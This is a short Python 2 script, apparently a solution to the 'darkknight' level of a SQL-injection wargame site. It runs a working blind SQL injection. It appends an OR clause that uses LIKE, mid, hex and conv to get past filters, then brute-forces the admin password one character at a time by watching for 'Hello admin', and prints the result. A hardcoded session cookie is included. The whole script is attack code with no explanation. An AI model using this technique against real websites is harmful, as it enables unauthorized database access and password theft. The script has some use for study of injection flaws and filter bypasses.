import requests
import re


cookie = {'PHPSESSID': 'hldutc71r5b68a3e2nvveko752'}

url = 'https://los.eagle-jump.org/darkknight_f76e2eebfeeeec2b7699a9ae976f574d.php?no=-1 '

cmp = "Hello admin"

dbname= ""

#Password is
for i in range(1, 10):
    for j in range(60, 173):
        query = url + ' or (id LIKE "a%" and conv(hex(mid(pw,' + str(i) + ',1)), 16, 8) in ("' + str(j)  + '"))-- -'
        req = requests.get(query, cookies=cookie)
        res=req.text
        tmp = re.findall(cmp, res)
        if tmp:
            dbname += chr(int(str(j), 8))
            break
        print str(j)
print "Password is : " + dbname
        
           
    
    
